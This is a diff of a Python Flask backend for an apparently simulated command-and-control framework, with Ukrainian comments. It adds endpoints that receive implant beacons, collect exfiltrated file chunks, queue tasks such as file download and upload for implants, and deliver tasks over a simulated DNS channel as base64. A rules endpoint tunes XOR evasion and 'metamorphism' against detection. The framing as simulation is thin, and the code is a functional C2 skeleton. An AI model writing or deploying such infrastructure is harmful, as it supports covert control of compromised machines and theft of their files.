+
+            recon_results_text = "\n".join(report_lines)
         else:
             return jsonify({"success": False, "error": f"Unknown recon_type: {recon_type}", "reconLog": "\n".join(log_messages+[f"[BE_ERR] Unknown type: {recon_type}"]) }), 400
 
@@ -1534,8 +1687,7 @@ def handle_run_recon():
 
 @app.route('/api/c2/beacon_receiver', methods=['POST'])
 def handle_c2_beacon():
-    # Повний код цього ендпоінта, як у версії 1.9.3
-    # ... (тут має бути повний код з app_py_v1_9_3) ...
+    # ... (Код без змін від v1.9.5) ...
     log_messages_c2_beacon = [f"[C2_BEACON_RECEIVER v{VERSION_BACKEND}] Запит о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
     global pending_tasks_for_implants, simulated_implants_be, exfiltrated_file_chunks_db
     try:
@@ -1565,7 +1717,8 @@ def handle_c2_beacon():
                  log_messages_c2_beacon.append(f"   [EXFIL_CHUNK] Отримано чанк #{chunk_num}/{total_chunks} для '{file_path}' (ID завдання: {last_task_id_received}).")
             if is_final_chunk or (total_chunks is not None and len(exfiltrated_file_chunks_db[file_key]["received_chunks"]) == total_chunks):
                 log_messages_c2_beacon.append(f"   [EXFIL_COMPLETE] Всі {total_chunks} чанків для '{file_path}' (ID завдання: {last_task_id_received}) отримано від {implant_id_from_beacon}.")
-                if file_key in exfiltrated_file_chunks_db: del exfiltrated_file_chunks_db[file_key]
+                # Тут можна було б зібрати файл, але для симуляції просто видаляємо запис
+                if file_key in exfiltrated_file_chunks_db: del exfiltrated_file_chunks_db[file_key] # Видаляємо, щоб не накопичувати
         elif beacon_data.get("file_exfil_error"): log_messages_c2_beacon.append(f"   [EXFIL_ERROR_REPORTED] Імплант повідомив про помилку ексфільтрації: {beacon_data['file_exfil_error']}")
         implant_found_in_list = False
         for implant in simulated_implants_be:
@@ -1596,33 +1749,199 @@ def handle_c2_beacon():
 
 @app.route('/api/c2/dns_resolver_sim', methods=['GET'])
 def handle_dns_resolver_sim():
-    # Повний код цього ендпоінта, як у версії 1.9.3
-    # ... (тут має бути повний код з app_py_v1_9_3) ...
-    return jsonify({"success": False, "error": "Not fully implemented in this snippet, see full file."})
+    # ... (Код без змін від v1.9.5) ...
+    log_messages_dns_sim = [f"[C2_DNS_SIM v{VERSION_BACKEND}] Запит о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
+    try:
+        query_hostname = request.args.get('q')
+        implant_id_from_dns_req = request.args.get('id')
+        log_messages_dns_sim.append(f"[C2_DNS_SIM_RECEIVED] Отримано DNS-запит (симуляція): q='{query_hostname}', id='{implant_id_from_dns_req}'.")
+        if not query_hostname or not implant_id_from_dns_req:
+            return jsonify({"success": False, "error": "Missing query or implant ID in DNS sim request", "log": "\n".join(log_messages_dns_sim)}), 400
+        
+        # Проста логіка: якщо є завдання для цього імпланта, кодуємо його в TXT-подібну відповідь
+        next_task_dns = None
+        if implant_id_from_dns_req in pending_tasks_for_implants and pending_tasks_for_implants[implant_id_from_dns_req]:
+            next_task_dns = pending_tasks_for_implants[implant_id_from_dns_req].pop(0) # Беремо перше завдання
+            if not pending_tasks_for_implants[implant_id_from_dns_req]:
+                del pending_tasks_for_implants[implant_id_from_dns_req] # Видаляємо, якщо черга порожня
+            log_messages_dns_sim.append(f"[C2_DNS_SIM_TASK_FOUND] Знайдено завдання для {implant_id_from_dns_req}: {next_task_dns.get('task_id')}")
+        
+        response_payload = {"message": "DNS query processed by Syntax C2 Simulator."}
+        if next_task_dns:
+            task_json_str = json.dumps(next_task_dns)
+            task_b64_str = base64.b64encode(task_json_str.encode('utf-8')).decode('utf-8')
+            response_payload["dns_txt_response_payload"] = task_b64_str # Імітація TXT запису з завданням
+            response_payload["task_data"] = next_task_dns # Для зручності налагодження, можна прибрати в продакшені
+            log_messages_dns_sim.append(f"[C2_DNS_SIM_RESPONSE_WITH_TASK] Відповідь з завданням (B64): {task_b64_str[:50]}...")
+        else:
+            log_messages_dns_sim.append("[C2_DNS_SIM_RESPONSE_NO_TASK] Відповідь без нового завдання.")
+
+        return jsonify({"success": True, **response_payload, "log": "\n".join(log_messages_dns_sim)}), 200
+    except Exception as e:
+        print(f"SERVER ERROR (dns_resolver_sim): {str(e)}"); import traceback; traceback.print_exc()
+        log_messages_dns_sim.append(f"[C2_DNS_SIM_FATAL_ERROR] {str(e)}")
+        return jsonify({"success": False, "error": "Server error processing DNS sim request", "log": "\n".join(log_messages_dns_sim)}), 500
+
 
 @app.route('/api/c2/implants', methods=['GET'])
 def get_c2_implants():
-    # Повний код цього ендпоінта, як у версії 1.9.3
-    # ... (тут має бути повний код з app_py_v1_9_3) ...
-    return jsonify({"success": False, "error": "Not fully implemented in this snippet, see full file."})
+    # ... (Код без змін від v1.9.5) ...
+    global simulated_implants_be
+    log_messages_c2_get_implants = [f"[C2_GET_IMPLANTS v{VERSION_BACKEND}] Запит о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
+    try:
+        # Оновлення статусу імплантів, якщо вони давно не виходили на зв'язок
+        current_time = time.time()
+        for implant in simulated_implants_be:
+            try:
+                last_seen_dt = datetime.strptime(implant["lastSeen"], '%Y-%m-%d %H:%M:%S')
+                if current_time - last_seen_dt.timestamp() > (implant.get("beacon_interval_sec", 60) * 5): # 5 інтервалів маячка
+                    implant["status"] = "offline_timeout"
+            except ValueError: # Якщо дата в неправильному форматі
+                 implant["status"] = "offline_unknown_lastseen"
+
+        log_messages_c2_get_implants.append(f"[C2_GET_IMPLANTS_INFO] Повернення {len(simulated_implants_be)} імітованих імплантів.")
+        return jsonify({"success": True, "implants": simulated_implants_be, "log": "\n".join(log_messages_c2_get_implants)}), 200
+    except Exception as e:
+        print(f"SERVER ERROR (get_c2_implants): {str(e)}"); import traceback; traceback.print_exc()
+        log_messages_c2_get_implants.append(f"[C2_GET_IMPLANTS_FATAL_ERROR] {str(e)}")
+        return jsonify({"success": False, "error": "Server error retrieving implants", "log": "\n".join(log_messages_c2_get_implants)}), 500
 
 @app.route('/api/c2/task', methods=['POST'])
 def handle_c2_task():
-    # Повний код цього ендпоінта, як у версії 1.9.3
-    # ... (тут має бути повний код з app_py_v1_9_3) ...
-    return jsonify({"success": False, "error": "Not fully implemented in this snippet, see full file."})
+    # ... (Код без змін від v1.9.5) ...
+    log_messages_c2_task = [f"[C2_TASK_HANDLER v{VERSION_BACKEND}] Запит о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
+    global pending_tasks_for_implants
+    try:
+        task_data = request.get_json()
+        if not task_data:
+            log_messages_c2_task.append("[C2_TASK_ERROR] Не отримано JSON даних завдання.")
+            return jsonify({"success": False, "error": "No JSON task data", "log": "\n".join(log_messages_c2_task)}), 400
+
+        implant_id = task_data.get("implant_id")
+        task_type = task_data.get("task_type")
+        task_params = task_data.get("task_params", "") # Може бути рядком або словником для upload_file_b64
+        queue_task_flag = task_data.get("queue_task", True) # За замовчуванням ставимо в чергу
+
+        log_messages_c2_task.append(f"[C2_TASK_RECEIVED] Отримано завдання для ID: {implant_id}, Тип: {task_type}, Параметри: {str(task_params)[:100]}..., Черга: {queue_task_flag}")
+
+        if not implant_id or not task_type:
+            log_messages_c2_task.append("[C2_TASK_ERROR] Відсутній ID імпланта або тип завдання.")
+            return jsonify({"success": False, "error": "Missing implant_id or task_type", "log": "\n".join(log_messages_c2_task)}), 400
+
+        # Перевірка, чи існує такий імплант (хоча б у симуляції)
+        if not any(imp['id'] == implant_id for imp in simulated_implants_be):
+            log_messages_c2_task.append(f"[C2_TASK_WARN] Спроба поставити завдання для невідомого імпланта ID: {implant_id}.")
+            # Можна повернути помилку, або все одно додати до черги, якщо очікується, що імплант з'явиться
+            # return jsonify({"success": False, "error": f"Implant ID {implant_id} not found.", "log": "\n".join(log_messages_c2_task)}), 404
+
+
+        new_task_id = f"TASK-{uuid.uuid4().hex[:8].upper()}"
+        task_to_queue = {
+            "task_id": new_task_id,
+            "task_type": task_type,
+            "task_params": task_params, # Зберігаємо як є (рядок або словник)
+            "timestamp_created": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        }
+
+        if implant_id not in pending_tasks_for_implants:
+            pending_tasks_for_implants[implant_id] = []
+        
+        pending_tasks_for_implants[implant_id].append(task_to_queue)
+        log_messages_c2_task.append(f"[C2_TASK_QUEUED] Завдання {new_task_id} ({task_type}) додано до черги для імпланта {implant_id}.")
+        
+        # Оновлення статусу імпланта, якщо він є
+        for implant_entry in simulated_implants_be:
+            if implant_entry["id"] == implant_id:
+                implant_entry["status"] = "task_pending"
+                break
+        
+        return jsonify({
+            "success": True, 
+            "message": f"Task {new_task_id} ({task_type}) queued for implant {implant_id}.",
+            "queued_task": task_to_queue,
+            "log": "\n".join(log_messages_c2_task)
+        }), 200
+
+    except Exception as e:
+        print(f"SERVER ERROR (handle_c2_task): {str(e)}"); import traceback; traceback.print_exc()
+        log_messages_c2_task.append(f"[C2_TASK_FATAL_ERROR] {str(e)}")
+        return jsonify({"success": False, "error": "Server error processing task", "log": "\n".join(log_messages_c2_task)}), 500
 
 @app.route('/api/operational_data', methods=['GET'])
 def get_operational_data():
-    # Повний код цього ендпоінта, як у версії 1.9.3
-    # ... (тут має бути повний код з app_py_v1_9_3) ...
-    return jsonify({"success": False, "error": "Not fully implemented in this snippet, see full file."})
+    # ... (Код без змін від v1.9.5) ...
+    log_messages_op_data = [f"[OPERATIONAL_DATA v{VERSION_BACKEND}] Запит о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
+    try:
+        sim_logs = generate_simulated_operational_logs_be()
+        sim_stats = get_simulated_stats_be()
+        
+        # Додамо лог про отримані файли/чанки, якщо є
+        if exfiltrated_file_chunks_db:
+            for file_key, file_info in list(exfiltrated_file_chunks_db.items()): # list() для копії, якщо будемо видаляти
+                num_received = len(file_info.get("received_chunks", {}))
+                total_chunks = file_info.get("total_chunks", "N/A")
+                sim_logs.append({
+                    "timestamp": file_info.get("first_seen", datetime.now().strftime('%Y-%m-%d %H:%M:%S')),
+                    "level": "INFO",
+                    "component": "C2_Exfil_Monitor_BE",
+                    "message": f"Exfiltrating '{file_info.get('file_path')}' from {file_info.get('implant_id')}. Received {num_received}/{total_chunks} chunks. Task ID: {file_info.get('task_id')}."
+                })
+        sim_logs.sort(key=lambda x: x["timestamp"], reverse=True) # Найновіші спочатку
+
+        log_messages_op_data.append("[OPERATIONAL_DATA_INFO] Згенеровано симульовані логи та статистику.")
+        return jsonify({
+            "success": True, 
+            "aggregatedLogs": sim_logs[:30], # Обмеження до 30 останніх логів
+            "statistics": sim_stats,
+            "log": "\n".join(log_messages_op_data)
+        }), 200
+    except Exception as e:
+        print(f"SERVER ERROR (get_operational_data): {str(e)}"); import traceback; traceback.print_exc()
+        log_messages_op_data.append(f"[OPERATIONAL_DATA_FATAL_ERROR] {str(e)}")
+        return jsonify({"success": False, "error": "Server error retrieving operational data", "log": "\n".join(log_messages_op_data)}), 500
 
 @app.route('/api/framework_rules', methods=['POST'])
 def update_framework_rules():
-    # Повний код цього ендпоінта, як у версії 1.9.3
-    # ... (тут має бути повний код з app_py_v1_9_3) ...
-    return jsonify({"success": False, "error": "Not fully implemented in this snippet, see full file."})
+    # ... (Код без змін від v1.9.5) ...
+    log_messages_rules = [f"[FRAMEWORK_RULES v{VERSION_BACKEND}] Запит о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
+    try:
+        data = request.get_json()
+        if not data:
+            log_messages_rules.append("[RULES_ERROR] Не отримано JSON даних.")
+            return jsonify({"success": False, "error": "No JSON data for rules", "log": "\n".join(log_messages_rules)}), 400
+
+        auto_adapt = data.get("auto_adapt_rules", False)
+        rule_id_to_update = data.get("rule_id")
+        new_value_for_rule = data.get("new_value")
+
+        log_messages_rules.append(f"[RULES_INFO] Отримано запит на оновлення правил. Авто-адаптація: {auto_adapt}, ID правила: '{rule_id_to_update}', Нове значення: '{new_value_for_rule}'.")
+        
+        # Тут мала б бути реальна логіка оновлення правил фреймворку.
+        # Для симуляції просто логуємо та повертаємо успіх.
+        
+        # Приклад симуляції зміни якогось параметра на основі вхідних даних
+        if rule_id_to_update == "EVASION_TECHNIQUE_XOR_PRIORITY":
+            try:
+                new_priority = float(new_value_for_rule)
+                # Тут можна було б оновити якусь глобальну змінну, що впливає на генерацію
+                log_messages_rules.append(f"[RULES_SIM_UPDATE] Пріоритет техніки XOR (симуляція) змінено на {new_priority}.")
+            except ValueError:
+                log_messages_rules.append(f"[RULES_SIM_WARN] Не вдалося перетворити '{new_value_for_rule}' на float для пріоритету XOR.")
+
+        if auto_adapt:
+            log_messages_rules.append("[RULES_SIM_AUTO_ADAPT] Режим автоматичної адаптації (симуляція) увімкнено. Фреймворк 'аналізує' дані для майбутніх оптимізацій.")
+            # Тут могла б бути логіка, що аналізує статистику та логи для прийняття рішень
+            # Наприклад, якщо statsDetectionRate високий, збільшити інтенсивність метаморфізму.
+
+        message_to_user = f"Правила фреймворку (концептуально) оновлено. ID: '{rule_id_to_update}', Нове значення: '{new_value_for_rule}'. Авто-адаптація: {auto_adapt}."
+        log_messages_rules.append(f"[RULES_SUCCESS] {message_to_user}")
+        
+        return jsonify({"success": True, "message": message_to_user, "log": "\n".join(log_messages_rules)}), 200
+    except Exception as e:
+        print(f"SERVER ERROR (update_framework_rules): {str(e)}"); import traceback; traceback.print_exc()
+        log_messages_rules.append(f"[RULES_FATAL_ERROR] {str(e)}")
+        return jsonify({"success": False, "error": "Server error updating framework rules", "log": "\n".join(log_messages_rules)}), 500
+
 
 if __name__ == '__main__':
     print("="*60)
@@ -1630,7 +1949,7 @@ if __name__ == '__main__':
     print("Запуск Flask-сервера на http://localhost:5000")
     print("Доступні ендпоінти:")
     print("  POST /api/generate_payload")
-    print("  POST /api/run_recon (типи: port_scan_basic, osint_email_search, osint_subdomain_search_concept, port_scan_nmap_standard, port_scan_nmap_cve_basic, port_scan_nmap_vuln_scripts)") # Додано новий тип
+    print("  POST /api/run_recon (типи: port_scan_basic, osint_email_search, osint_subdomain_search_concept, port_scan_nmap_standard, port_scan_nmap_cve_basic, port_scan_nmap_vuln_scripts)")
     print("  GET  /api/c2/implants")
     print("  POST /api/c2/task  (включає 'download_file', 'upload_file_b64')")
     print("  POST /api/c2/beacon_receiver")
@@ -1642,3 +1961,4 @@ if __name__ == '__main__':
     print("Натисніть Ctrl+C для зупинки.")
     print("="*60)
     app.run(host='localhost', port=5000, debug=False)
+    
